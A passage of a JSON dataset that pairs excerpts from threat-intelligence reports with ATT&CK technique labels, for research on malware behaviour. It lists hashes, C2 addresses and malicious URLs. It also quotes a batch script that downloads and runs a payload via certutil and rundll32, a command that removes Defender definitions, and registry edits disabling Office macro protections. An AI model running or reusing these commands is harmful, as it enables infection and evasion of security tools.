            "Related MD5s 62c4ce93050e48d623569c7dcc4d0278, 2537.ex_ a5d6ad8ad82c266fda96e076335a5080, drop1.ex_ 93176df76e351b3ea829e0e6c6832bdf, drop1.pd_ 7688be226b946e231e0cd36e6b708d20, 8.zip fd8e27f820bdbdf6cb80a46c67fd978a, doc853.ex_ 93176df76e351b3ea829e0e6c6832bdf, doc853.pdf 9ad55b83f2eec0c19873a770b0c86a2f, reader_sl.ex_ f16dff8ec8702518471f637eb5313ab2 1.ex_ 8670710bc9477431a01a576b6b5c1b2a 93176df76e351b3ea829e0e6c6832bdf, dropped\\hppscan854.pdf f58a4369b8176edbde4396dc977c9008, dropped\\reader_sl.ex_ 83f57f0116a3b3d69ef7b1dbe9943801 b5553645fe819a93aafe2894da13dae7 acffb2823fc655637657dcbd25f35af8 1a42acbdb285a7fba17f95068822ea4e d543904651b180fd5e4dc1584e639b5e d7af9a4010c75af6756a603fd6aef5a4 93176df76e351b3ea829e0e6c6832bdf, 3852.pdf f2b05e6b01be3b6cb14e9068e7a66fc1, dropped\\reader_sl.ex_ 57a1f0658712ee7b3a724b6d07e97259, dropped\\3852.ex_ 93176df76e351b3ea829e0e6c6832bdf, 5463.pdf eb22b99d44223866e24872d80a4ddefd, dropped\\5463\\reader_sl.ex_ 90bd910ee161b71c7a37ac642f910059, dropped\\5463.ex_ 1a262a7bfecd981d7874633f41ea5de8 98a6484533fa12a9ba6b1bd9df1899dc 7f6bca4f08c63e597bed969f5b729c56 08709ef0e3d467ce843af4deb77d74d5 Related CozyDuke C&Cs: 121.193.130.170:443/wp-ajax.php 183.78.169.5:443/search.php 200.119.128.45:443/mobile.php 200.125.133.28:443/search.php 200.125.142.11:443/news.php 201.76.51.10:443/plugins/json.php 202.206.232.20:443/rss.php 202.76.237.216:443/search.php 203.156.161.49:443/plugins/twitter.php 208.75.241.246:443/msearch.php 209.40.72.2:443/plugins/fsearch.php 210.59.2.20:443/search.php 208.77.177.24:443/fsearch.php www.getiton.hants.org.uk:80/themes/front/img/ajax.php www.seccionpolitica.com.ar:80/galeria/index.php 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/profile.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Appendix: Parallel and Previous Research The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor, Securelist, Feb 2013Miniduke is back: Nemesis Gemina and the Botgen Studio, Securelist, July 2014MiniDuke 2 (CosmicDuke), CrySyS, July 2014COSMICDUKE Cosmu with a twist of MiniDuke [pdf], F-Secure, September 2014THE CASE OF THE MODIFIED BINARIES, Leviathan Security, October 2014A word on CosmicDuke, Blaze\u2019s Security Blog, September 2014OnionDuke: APT Attacks Via the Tor Network, F-Secure, November 2014The Connections Between MiniDuke, CosmicDuke and OnionDuke, F-Secure, January 2015 Kaspersky Lab products detect the malware used by the CozyDuke threat actor as: HEUR:Trojan.Win32.CozyDuke.gen Trojan.Win32.CozyBear.*"
        ]
    },
    "standard application layer protocol exfiltration over alternative protocol-multi": {
        "technique_names": [
            "standard application layer protocol",
            "exfiltration over alternative protocol"
        ],
        "sentances": [
            "These samples communicated with the following hosts via FTP for C2 communication:  ftp.byethost7[.]com ftp.byethost10[.]com files.000webhost[.]com  Beginning in June 2018, we observed the OceanSalt malware family being dropped by CARROTBAT"
        ]
    },
    "standard application layer protocol rundll32-multi": {
        "technique_names": [
            "standard application layer protocol",
            "rundll32"
        ],
        "sentances": [
            "In this particular instance, the following script is retrieved:@echo off  :if exist \"%PROGRAMFILES(x86)%\" (GOTO 64BITOS) ELSE (GOTO 32BITOS)  :32BITOS certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup.txt > nul certutil -decode -f setup.txt setup.cab > nul del /f /q setup.txt > nul GOTO ISEXIST  :64BITOS :certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup2.txt > nul :certutil -d^ecode -f setup2.txt setup.cab > nul :del /f /q setup2.txt > nul :GOTO ISEXIST  :ISEXIST  if exist \"setup.cab\" (GOTO EXECUTE) ELSE (GOTO EXIT)  :EXECUTE ver | findstr /i \"10\\.\" > nul IF %ERRORLEVEL% EQU 0 (GOTO WIN10) ELSE (GOTO OTHEROS)  :WIN10 expand %TEMP%\\setup.cab -F:* %CD% > nul :if exist \"%PROGRAMFILES(x86)%\" (rundll32 %TEMP%\\drv.dll EntryPoint) ELSE (rundll32 %TEMP%\\drv.dll EntryPoint) %TEMP%\\install.bat GOTO EXIT  :OTHEROS wusa %TEMP%\\setup.cab /quiet /extract:%TEMP% > nul %TEMP%\\install.bat GOTO EXIT  :EXIT del /f /q setup.cab > nul del /f /q %~dpnx0 > nulThis script simply checks the operating system of the victim and downloads the respective payload again using the certutil executable"
        ]
    },
    "masquerading file and directory discovery scripting remote file copy-multi": {
        "technique_names": [
            "masquerading",
            "file and directory discovery",
            "scripting",
            "remote file copy",
            "tor"
        ],
        "sentances": [
            "Figure 8 CARROTBAT downloading final payload via certutil \u00a0 The downloaded CAB file has the following properties:    MD5 a943e196b83c4acd9c5ce13e4c43b4f4   SHA1 e66e416f300c7efb90c383a7630c9cfe901ff9fd   SHA256 cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62   File Type Microsoft Cabinet archive data, 181248 bytes, 3 files    \u00a0 The following three files and their descriptions are dropped by this CAB file: \u00a0    Filename Purpose   Install.bat Installation batch script responsible for copying the other files to C:\\Users\\Public\\Downloads and setting the Run registry key to ensure persistence"
        ]
    },
    "spearphishing link standard application layer protocol exfiltration over alternative protocol-multi": {
        "technique_names": [
            "spearphishing link",
            "standard application layer protocol",
            "exfiltration over alternative protocol",
            "arp"
        ],
        "sentances": [
            "CARROTBAT Samples d34aabf20ccd93df9d43838cea41a7e243009a3ef055966cb9dea75d84b2724d 8b6b4a0e0945c6daf3ebc8870e3bd37e54751f95162232d85dc0a0cc8bead9aa 26fc6fa6acc942d186a31dc62be0de5e07d6201bdff5d7b2f1a7521d1d909847 e218b19252f242a8f10990ddb749f34430d3d7697cbfb6808542f609d2cbf828 824f79a8ee7d8a23a0371fab83de44db6014f4d9bdea90b47620064e232fd3e3 70106ebdbf4411c32596dae3f1ff7bf192b81b0809f8ed1435122bc2a33a2e22 87c50166f2ac41bec7b0f3e3dba20c7264ae83b13e9a6489055912d4201cbdfc ac23017efc19804de64317cbc90efd63e814b5bb168c300cfec4cfdedf376f4f d965627a12063172f12d5375c449c3eef505fde1ce4f5566e27ef2882002b5d0 7d443434c302431734caf1d034c054ad80493c4c703d5aaeafa4a931a496b2ae 1142dcc02b9ef34dca2f28c22613a0489a653eb0aeafe1370ca4c00200d479e0 337b8c2aac80a44f4e7f253a149c65312bc952661169066fe1d4c113348cc27b 92b45e9a3f26b2eef4a86f3dae029f5821cffec78c6c64334055d75dbf2a62ef 42e18ef3aaadac5b40a37ec0b3686c0c2976d65c978a2b685fefe50662876ded ba78f0a6ce53682942e97b5ad7ec76a2383468a8b6cd5771209812b6410f10cb dca9bd1c2d068fc9c84a754e4dcf703629fbe2aa33a089cb50a7e33e073f5cea 7d8376057a937573c099e3afe2d8e4b8ec8cb17e46583a2cab1a4ac4b8be1c97 3cbccb059225669dcfdc7542ce28666e0b1a227714eaf4b16869808bffe90b96 aef92be267a05cbff83aec0f23d33dfe0c4cdc71f9a424f5a2e59ba62b7091de 2547b958f7725539e9bba2a1852a163100daa1927bb621b2837bb88007857a48 6c591dddd05a2462e252997dc9d1ba09a9d9049df564d00070c7da36e526a66a 22b16fa7af7b51880faceb33dd556242331daf7b7749cabd9d7c9735fb56aa10 3869c738fa80b1e127f97c0afdb6c2e1c15115f183480777977b8422561980dd ba100e7bac8672b9fd73f2d0b7f419378f81ffb56830f6e27079cb4a064ba39a e527ade24beacb2ef940210ba9acb21073e2b0dadcd92f1b8f6acd72b523c828 9fa69bdc731015aa7bdd86cd311443e6f829fa27a9ba0adcd49fa773fb5e7fa9 ffd1e66c2385dae0bb6dda186f004800eb6ceaed132aec2ea42b1ddcf12a5c4e e3b45b2e5d3e37f8774ae22a21738ae345e44c07ff58f1ab7178a3a43590fddd a0f53abde0d15497776e975842e7df350d155b8e63d872a914581314aaa9c1dc \u00a0 SYSCON Payload Samples 5a2c53a20fd66467e87290f5845a5c7d6aa8d460426abd30d4a6adcffca06b8b fceceb104bed6c8e85fff87b1bf06fde5b4a57fe7240b562a51727a37034f659 fa712f2bebf30592dd9bba4fc3befced4c727b85a036550fc3ac70d1965f8de5 da94a331424bc1074512f12d7d98dc5d8c5028821dfcbe83f67f49743ae70652 2efdd25a8a8f21c661aab2d4110cd7f89cf343ec6a8674ff20a37a1750708f27 62886d8b9289bd92c9b899515ff0c12966b96dd3e4b69a00264da50248254bb7 f27d640283372eb805df794ae700c25f789d77165bb98b7174ee03a617a566d4 0bb099849ed7076177aa8678de65393ef0d66e026ad5ab6805c1c47222f26358 f4c00cc0d7872fb756e2dc902f1a22d14885bf283c8e183a81b2927b363f5084 e8381f037a8f70d8fc3ee11a7bec98d6406a289e1372c8ce21cf00e55487dafc 1c8351ff968f16ee904031f6fba8628af5ca0db01b9d775137076ead54155968 2da750b50ac396a41e99752d791d106b686be10c27c6933f0d3afe762d6d0c48 5d1388c23c94489d2a166a429b8802d726298be7eb0c95585f2759cebad040cf 0490e7d24defc2f0a4239e76197f1cba50e7ce4e092080d2f7db13ea0f88120b \u00a0 OceanSalt Payload Samples 59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005 7cf37067f08b0b8f9c58a35d409fdd6481337bdc2d5f2152f8e8f304f8a472b6 fe8d65287dd40ca0a1fadddc4268268b4a77cdb04a490c1a73aa15b6e4f1dd63 a23f95b4a602bdaef1b58e97843e2f38218554eb57397210a1aaa68508843bd0 59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005 cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62 7ae933ed7fc664df4865840f39bfeaf9daeb3b88dcd921a90366635d59bc15f2 3663e7b197efe91fb7879a56c29fb8ed196815e0145436ee2fad5825c29de897 59b023b30d8a76c5984fe62d2e751875b8b3ebe2d520891458cb66a4e9c40005 7ae933ed7fc664df4865840f39bfeaf9daeb3b88dcd921a90366635d59bc15f2 cf31dac47680ff1375ddaa3720892ed3a7a70d1872ee46e6366e6f93123f58d2 fe186d04ca6afec2578386b971b5ecb189d8381be055790a9e6f78b3f23c9958 \u00a0 Infrastructure https://881.000webhostapp[.]com/1.txt http://attach10132.1apps[.]com/1.txt https://071790.000webhostapp[.]com/1.txt https://vnik.000webhostapp[.]com/1.txt https://7077.000webhostapp[.]com/vic/1.txt http://a7788.1apps[.]com/att/1.txt http://s8877.1apps[.]com/vip/1.txt http://hanbosston.000webhostapp[.]com/1.txt http://bluemountain.1apps[.]com/1.txt https://www.webmail-koryogroup[.]com/keep/1.txt http://filer1.1apps[.]com/1.txt ftp.byethost7[.]com ftp.byethost10[.]com files.000 webhost[.]com 61.14.210[.]72:7117 The post The Fractured Block Campaign: CARROTBAT Used to Deliver Malware Targeting Southeast Asia appeared first on Unit42."
        ]
    },
    "process hollowing spearphishing link fallback channels-multi": {
        "technique_names": [
            "process hollowing",
            "spearphishing link",
            "fallback channels",
            "arp"
        ],
        "sentances": [
            "An example of a domain structure and malware delivery contents is shown in the following table: \u00a0    SHA-256 Infrastructure URL   4e4967e3d39256049bc1054b966e5c609245fd3b2a934fda5cd1885526d8221e stemtopx[.]com/work/1.doc   d2f58b08f8abfe5055f3c1f0b8d991dfe1deb62807a5336b134ce2fb36d87284 stemtopx[.]com/work/3.exe   db4d8d931f1b979cf32d311f9b03e851d3283b4f7e86252730247da25cf9f093 stemtopx[.]com/work/2.exe   4c6e3d8fdb2394edffe4a5bc45a238749e929301efa8bcfa3a247b1ab68eac54 stemtopx[.]com/work/1.exe   81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/new/20.exe   26151f1e24bc97532e49013fbe04919de1f51e346dba1f10ce2e389160f2fb9d stemtopx[.]com/work/new/3.exe   a100ce0a67c5890bcc38d2b6e30f9164dfe266126ec40a2fd7eb8e941dc7d025 stemtopx[.]com/work/new/2.exe   806098afc2148dabb838b24c4dfaa148269ac3ddf769aee54e75d46bfef0c506 stemtopx[.]com/work/doc/20.doc   bf37d6cb393b440f790ad2b333624fde079e10bfaeb44d65188e3ccc551c982f stemtopx[.]com/work/k/1.docx   81de431987304676134138705fc1c21188ad7f27edf6b77a6551aa693194485e stemtopx[.]com/work/k/1s.exe     Table 1"
        ]
    },
    "process injection remote file copy-multi": {
        "technique_names": [
            "process injection",
            "remote file copy"
        ],
        "sentances": [
            "The infection process is rather interesting, as it involves multiple layers of .NET assemblies that will eventually download the NanoCore remote administration tool (RAT) from a remote server and inject it into another process"
        ]
    },
    "process hollowing masquerading modify registry-multi": {
        "technique_names": [
            "process hollowing",
            "masquerading",
            "modify registry"
        ],
        "sentances": [
            "The macro performs all of these activities with the following command:cmd /c taskkill /f /im winword.exe&taskkill /f /im Excel.exe&taskkill  /f /im MSPUB.exe&taskkill /f /im POWERPNT.EXE&taskkill /f /im  MSASCuiL.exe&taskkill /f /im MpCmdRun.exe&cd \"\"%ProgramFiles%\\Windows  Defender\"\" & MpCmdRun.exe -removedefinitions -dynamicsignatures & exitThe macro also attempts to deactivate security mechanisms within Microsoft Office products by modifying the registry"
        ]
    },
    "code signing security software discovery data from local system binary padding modify registry spearphishing attachment virtualization/sandbox evasion user execution exploitation for client execution-multi": {
        "technique_names": [
            "code signing",
            "security software discovery",
            "data from local system",
            "binary padding",
            "modify registry",
            "spearphishing attachment",
            "user execution",
            "exploitation for client execution",
            "arp",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "First, the macro attempts to enable macros in multiple versions of Word, PowerPoint, Publisher and Excel by setting the following registry keys to the value of 1:HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\11.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\publisher\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarningsThe macro also attempts to disable protections provided by the Protected View capability within Word, Excel, and PowerPoint by setting the following registry keys to a value of 1:HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocationsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV  HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\u00a0 First Stage Payload The payload installed by the macro is a downloader Trojan written in VB.NET that downloads a secondary payload and decoy document"
        ]
    },
    "deobfuscate/decode files or information masquerading binary padding drive-by compromise-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "masquerading",
            "binary padding",
            "drive-by compromise"
        ],
        "sentances": [
            "The following functions are called when the application attempts to initialize the menu:ETransaksi.Speed(); // Legitimate class, but method is the first  wrapped function that leads to malicious code ProjectData.EndApp(); // Closes the application before rest of  legitimate Sales System Application functions are calledThe \u201cSpeed\u201d method in the legitimate ETransaksi class contains legitimate code from the Sales System Application; however, the author of this tool includes this code in an if/else construct that bypasses these instructions by setting a false flag to skip the legitimate code and execute the next step to the malicious code"
        ]
    },
    "process hollowing registry run keys / startup folder-multi": {
        "technique_names": [
            "process hollowing",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "It then creates the following registry key to automatically run the Trojan each time the system starts: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\@RANDOM@ The main behavior carried out by this Trojan involves obtaining an embedded executable, hollowing the current Trojan, writing the new embedded executable to the process memory and calling a specific function in the newly written payload"
        ]
    },
    "standard application layer protocol spearphishing attachment file and directory discovery exfiltration over alternative protocol dll side-loading fallback channels commonly used port-multi": {
        "technique_names": [
            "standard application layer protocol",
            "spearphishing attachment",
            "file and directory discovery",
            "exfiltration over alternative protocol",
            "dll side-loading",
            "fallback channels",
            "commonly used port",
            "arp",
            "tor"
        ],
        "sentances": [
            "This variant of NanoCore was configured to communicate with the following IP address as its C2 server over TCP port 6666: \u00a0 115.186.136[.]237 \u00a0 Bitly short URLs and expanded domains    Short Bitly URL Expanded URL   http://bit[.]ly/Loaloding http://www.asaigoldenrice[.]com/daq/doc/2.doc   http://bit[.]ly/Loadingnnsa http://onedrivenet[.]xyz/work/docnew/4.doc   http://bit[.]ly/2JmQLW6 http://stemtopx[.]com/work/doc/13.doc   http://bit[.]ly/2JsruKm http://stemtopx[.]com/work/doc/4.doc   http://bit[.]ly/2GUaY49 http://fast-cargo[.]com/images/file/vb/VBS/doc/3.doc   http://bit[.]ly/Loadingnns http://onedrivenet[.]xyz/work/docnew/4.doc   http://bit[.]ly/2Im2IOF http://panelonetwothree[.]ml/zico/doc/doc8/zloadings.doc   http://bit[.]ly/primeload http://fast-cargo[.]com/images/file/vb/VBS/doc/1.doc   http://bit[.]ly/loader2018 http://asaigoldenrice[.]com/sim/new.doc   http://bit[.]ly/2xZ1kO6wdscsac http://stemtopx[.]com/work/doc/3.doc   http://bit[.]ly/2M2bIYh http://stemtopx[.]com/work/doc/root.doc   http://bit[.]ly/2r9PSIv http://stevemike-fireforce[.]info/work/doc/11.doc   http://bit[.]ly/Loadiendg http://www.0-day[.]us/img/doc/6.doc   http://bit[.]ly/2rpmJKsrdtrdtdfysersgerstrdFCGRDR http://stevemikeforce[.]com/work/doc/7.doc   http://bit[.]ly/2Fu4ZSfloading http://panelonetwothree[.]ml/zico/xe/snoop/ocsnoop/snoop.doc   http://bit[.]ly/2HloaderqVbva http://diamondfoxpanel[.]ml/doc/1/11.doc   http://bit[.]ly/Loardising http://onedrivenet[.]xyz/work/docnew/12.doc   http://bit[.]ly/2JB3KXD http://stemtopx[.]com/work/doc/8.doc   http://bit[.]ly/1_loadingH7TvJa http://diamondfoxpanel[.]ml/doc/1.doc   http://bit[.]ly/Loadijging http://onedrivenet[.]xyz/work/docnew/8.doc   http://bit[.]ly/Laodiingplease http://onedrivenet[.]xyz/work/docnew/13.doc   http://bit[.]ly/2HvQBirEam832ASADx http://stevemike-fireforce[.]info/work/dola/3.doc   http://bit[.]ly/2I5T7b9hgvgvjcVYVY http://stevemikeforce[.]com/work/doc/6.doc   http://bit[.]ly/paymentsuae http://brevini-france[.]cf/xp/doc/swift.doc   http://bit[.]ly/Laodingipleasewait http://www.asaigoldenrice[.]com/daq/doc/10.doc   http://bit[.]ly/loadingxxxx http://www.asaigoldenrice[.]com/daq/doc/4.doc   http://bit[.]ly/2Gmziko http://zupaservices[.]info/doc/z.doc   http://bit[.]ly/2sQhJOO http://stemtopx[.]com/work/doc/6.doc   http://bit[.]ly/laodinfokqaw http://stevemike-fireforce[.]info/work/doc/5.doc   http://bit[.]ly/loadrinfing http://www.asaigoldenrice[.]com/daq/doc/15.doc   http://bit[.]ly/2JaBgAS http://acorn-paper[.]com/administrator/help/7.doc   http://bit[.]ly/2loadingqlOQcM http://diamondfoxpanel[.]ml/doc/4/44.doc   http://bit[.]ly/loardding http://fast-cargo[.]com/images/file/vb/VBS/doc/11.doc   http://bit[.]ly/loidaring https://www.0-day[.]us/img/doc/5.doc   http://bit[.]ly/LoadingPleaseWait http://www.asaigoldenrice[.]com/daq/doc/20.doc   http://bit[.]ly/2HJv5Ud http://stevemike-fireforce[.]info/work/doc/1.doc   http://bit[.]ly/Loading13 http://fast-cargo[.]com/images/file/vb/VBS/doc/13.doc   http://bit[.]ly/2Lzpjp1 http://stemtopx[.]com/work/doc/19.doc   http://bit[.]ly/tt_seafood http://acorn-paper[.]com/administrator/help/en-GB/8.doc   http://bit[.]ly/Lording http://fast-cargo[.]com/images/file/vb/VBS/doc/7.doc   http://bit[.]ly/loadingsmins http://www.asaigoldenrice[.]com/daq/doc/1.doc   http://bit[.]ly/2_loadingJwkhJA http://diamondfoxpanel[.]ml/doc/7.doc   http://bit[.]ly/Laodiingpleasesa http://onedrivenet[.]xyz/work/docnew/13.doc   http://bit[.]ly/2tnW5lu http://stemtopx[.]com/work/newdoc/1.doc   http://bit[.]ly/tt_loading http://acorn-paper[.]com/administrator/components/com_templates/4.doc   http://bit[.]ly/2wzkloading http://panelonetwothree[.]ml/zico/doc/zloading.doc   http://bit[.]ly/Loadingans http://onedrivenet[.]xyz/work/docnew/14.doc   http://bit[.]ly/2r9jLcQloading http://panelonetwothree[.]ml/zico/doc/zik.doc   http://bit[.]ly/loadingpleasewairrs http://stevemike-fireforce[.]info/work/dola/2.doc   http://bit[.]ly/2arubabKmpgwP http://panelonetwothree[.]ml/iran/uae/done/oc/uae.doc   http://bit[.]ly/2HAwzmN3290293sadjokwwadjoW http://stevemike-fireforce[.]info/work/doc/12.doc   http://bit[.]ly/loadingasz http://0-day[.]us/img/doc/10.doc   http://bit[.]ly/ntissa2vFamys http://acorn-paper[.]com/images/locations/thumbnails/oc/m.doc   http://bit[.]ly/2IgzmRxEmasidE9kEjidlE http://panelonetwothree[.]ga/work/doc/3.doc   http://bit[.]ly/2JqmuWp http://stemtopx[.]com/work/doc/16.doc   http://bit[.]ly/load242HmFqZ6 http://panelonetwothree[.]ml/simon/exp/oc/mm.doc   http://bit[.]ly/2L17QGqloading http://panelonetwothree[.]ml/zico/doc/doc8/zxloading.doc   http://bit[.]ly/2MarX5t http://stemtopx[.]com/work/doc/9.doc   http://bit[.]ly/Loadingnix http://www.asaigoldenrice[.]com/daq/doc/3.doc   http://bit[.]ly/2HyVGGy_loading http://panelonetwothree[.]ml/iran/uae/done/oc1/uae.doc   http://bit[.]ly/2H8euros http://acorn-paper[.]com/administrator/components/com_templates/views/2.doc   http://bit[.]ly/2I2mUBFstthdhtrhdtyftfyj http://stevemikeforce[.]com/work/doc/8.doc   http://bit[.]ly/Loininding http://www.0-day[.]us/img/doc/8.doc   http://bit[.]ly/2F02ZRq http://stevemike-fireforce[.]info/work/doc/2.doc   http://bit[.]ly/Loadingpleasewait http://onedrivenet[.]xyz/work/docnew/19.doc   http://bit[.]ly/2jE36KjhvjhgkHJHKLHGFHJ http://stevemikeforce[.]com/work/doc/3.doc   http://bit[.]ly/Waitpleasewait http://stevemike-fireforce[.]info/work/doc/8.doc   http://bit[.]ly/Loiading http://fast-cargo[.]com/images/file/newvbs/doc/1.doc   http://bit[.]ly/Loadingplasewaitsm http://stevemike-fireforce[.]info/work/doc/3.doc   http://bit[.]ly/2jCTHCNasiudhasdASdy7656basdu http://stevemikeforce[.]com/work/doc/2.doc   http://bit[.]ly/loadingpleaswaitrr http://stevemike-fireforce[.]info/work/doc/4.doc   http://bit[.]ly/Loadingnsi http://onedrivenet[.]xyz/work/docnew/2.doc   http://bit[.]ly/2JRUNKh http://www.stemtopx[.]com/work/newdoc/3.doc   http://bit[.]ly/2Hload25YdU19 http://panelonetwothree[.]ml/simon/exp/oc/25/m25.doc   http://bit[.]ly/2lording http://fast-cargo[.]com/images/file/vb/VBS/doc/8.doc   http://bit[.]ly/2M9lLL6 http://stemtopx[.]com/work/doc/15.doc   http://bit[.]ly/Loggeding http://fast-cargo[.]com/images/file/newvbs/doc/4.doc   http://bit[.]ly/Loadingwaitplez http://stevemike-fireforce[.]info/work/doc/10.doc   http://bit[.]ly/ASDj23234j4oDj3234Sdmk 